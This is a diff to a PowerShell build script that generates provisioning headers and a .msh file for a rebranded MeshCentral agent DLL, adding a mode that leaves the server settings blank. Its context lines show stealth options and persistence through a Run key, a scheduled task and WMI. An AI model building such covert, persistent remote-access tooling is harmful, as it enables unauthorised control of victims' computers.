@@ -253,6 +253,14 @@ if ($networkDynamic) {
     $fallbackCount = 0
     $fallbackListMacro = "{ }"
 }
+$meshTypeRaw = Get-OptionalValue -Source $config.provisioning -PropertyName 'meshType'
+$meshIdMacroValue = if ($networkDynamic) { "" } else { $meshIdHeaderValue }
+$serverIdMacroValue = if ($networkDynamic) { "" } else { [string](Get-OptionalValue -Source $config.provisioning -PropertyName 'serverId') }
+$meshNameMacroValue = if ($networkDynamic) { "" } else { [string](Get-OptionalValue -Source $config.provisioning -PropertyName 'meshName') }
+$meshServerUrlMacroValue = if ($networkDynamic) { "" } else { [string](Get-OptionalValue -Source $config.provisioning -PropertyName 'serverUrl') }
+$meshTypeMacroValue = if ($networkDynamic) { 0 } else {
+    if ($null -eq $meshTypeRaw -or $meshTypeRaw -eq "") { 0 } else { $meshTypeRaw }
+}
 $persistRunKeyFlag = BoolToInt (Get-OptionalBool -Source $persistence -PropertyName 'runKey')
 $persistTaskFlag = BoolToInt (Get-OptionalBool -Source $scheduledTask -PropertyName 'enabled')
 $persistWmiFlag = BoolToInt (Get-OptionalBool -Source $wmiSection -PropertyName 'enabled')
@@ -427,11 +435,11 @@ $header = @"
 #define MESH_ALPN_PROTOCOLS $networkAlpnLiteral
 
 /* ========== Provisioning Data ========== */
-#define MESH_AGENT_MESH_ID "$meshIdHeaderValue"
-#define MESH_AGENT_SERVER_ID "$($config.provisioning.serverId)"
-#define MESH_AGENT_MESH_NAME "$($config.provisioning.meshName)"
-#define MESH_AGENT_SERVER_URL "$($config.provisioning.serverUrl)"
-#define MESH_AGENT_MESH_TYPE $($config.provisioning.meshType)
+#define MESH_AGENT_MESH_ID "$meshIdMacroValue"
+#define MESH_AGENT_SERVER_ID "$serverIdMacroValue"
+#define MESH_AGENT_MESH_NAME "$meshNameMacroValue"
+#define MESH_AGENT_SERVER_URL "$meshServerUrlMacroValue"
+#define MESH_AGENT_MESH_TYPE $meshTypeMacroValue
 
 /* ========== Stealth Features ========== */
 #define MESH_AGENT_STEALTH_ENABLED $stealthEnabledFlag
@@ -488,13 +496,13 @@ Write-Host "[SUCCESS] Branding header generated: $OutputHeader" -ForegroundColor
 # Generate .msh file (MeshCentral key/value format)
 $mshLines = @()
 $meshNameValue = Get-OptionalValue -Source $config.provisioning -PropertyName 'meshName'
-if ($meshNameValue) { $mshLines += "MeshName=$meshNameValue" }
 $meshTypeValue = Get-OptionalValue -Source $config.provisioning -PropertyName 'meshType'
+$serverIdValue = Get-OptionalValue -Source $config.provisioning -PropertyName 'serverId'
+$serverUrlValue = Get-OptionalValue -Source $config.provisioning -PropertyName 'serverUrl'
+if ($meshNameValue) { $mshLines += "MeshName=$meshNameValue" }
 if ($meshTypeValue) { $mshLines += "MeshType=$meshTypeValue" }
 if ($meshIdHeaderValue) { $mshLines += "MeshID=$meshIdHeaderValue" }
-$serverIdValue = Get-OptionalValue -Source $config.provisioning -PropertyName 'serverId'
 if ($serverIdValue) { $mshLines += "ServerID=$serverIdValue" }
-$serverUrlValue = Get-OptionalValue -Source $config.provisioning -PropertyName 'serverUrl'
 if ($serverUrlValue) { $mshLines += "MeshServer=$serverUrlValue" }
 $serviceNameValue = $config.branding.serviceName
 if ($serviceNameValue) { $mshLines += "meshServiceName=$serviceNameValue" }
@@ -512,20 +520,23 @@ Write-Host "[SUCCESS] .msh file generated: $OutputMsh" -ForegroundColor Green
 
 Write-Host ""
 Write-Host "=== Provisioning Embedded ===" -ForegroundColor Green
-if ($meshIdRawValue) {
+if (-not $networkDynamic -and $meshIdRawValue) {
     $meshIdPreview = if ($meshIdRawValue.Length -gt 20) { $meshIdRawValue.Substring(0,20) + "..." } else { $meshIdRawValue }
     Write-Host "Mesh ID:   $meshIdPreview" -ForegroundColor Cyan
 }
-if ($meshIdHeaderValue -and $meshIdHeaderValue -ne $meshIdRawValue) {
+if (-not $networkDynamic -and $meshIdHeaderValue -and $meshIdHeaderValue -ne $meshIdRawValue) {
     $meshIdHexPreview = if ($meshIdHeaderValue.Length -gt 20) { $meshIdHeaderValue.Substring(0,20) + "..." } else { $meshIdHeaderValue }
     Write-Host "Mesh ID (hex): $meshIdHexPreview" -ForegroundColor Cyan
 }
-if ($serverIdValue) {
+if (-not $networkDynamic -and $serverIdValue) {
     $serverIdPreview = if ($serverIdValue.Length -gt 20) { $serverIdValue.Substring(0,20) + "..." } else { $serverIdValue }
     Write-Host "Server ID: $serverIdPreview" -ForegroundColor Cyan
 }
-Write-Host "Endpoint:  $($networkSection.primaryEndpoint)" -ForegroundColor Cyan
-if ($fallbackCount -gt 0) {
+if ($networkDynamic) {
+    Write-Host "Endpoint:  <MeshCentral provisioning>" -ForegroundColor Cyan
+    Write-Host "  Fallbacks: (managed by MeshCentral)" -ForegroundColor DarkGray
+} elseif ($fallbackCount -gt 0) {
+    Write-Host "Endpoint:  $($networkSection.primaryEndpoint)" -ForegroundColor Cyan
     $idx = 1
     foreach ($entry in $fallbackEntries) {
         $details = @()
@@ -538,7 +549,8 @@ if ($fallbackCount -gt 0) {
         $idx++
     }
 } else {
-Write-Host "  Fallbacks: (none)" -ForegroundColor DarkGray
+    Write-Host "Endpoint:  $($networkSection.primaryEndpoint)" -ForegroundColor Cyan
+    Write-Host "  Fallbacks: (none)" -ForegroundColor DarkGray
 }
 Write-Host ""
 Write-Host "Ready to build MeshAgent DLL!" -ForegroundColor Green
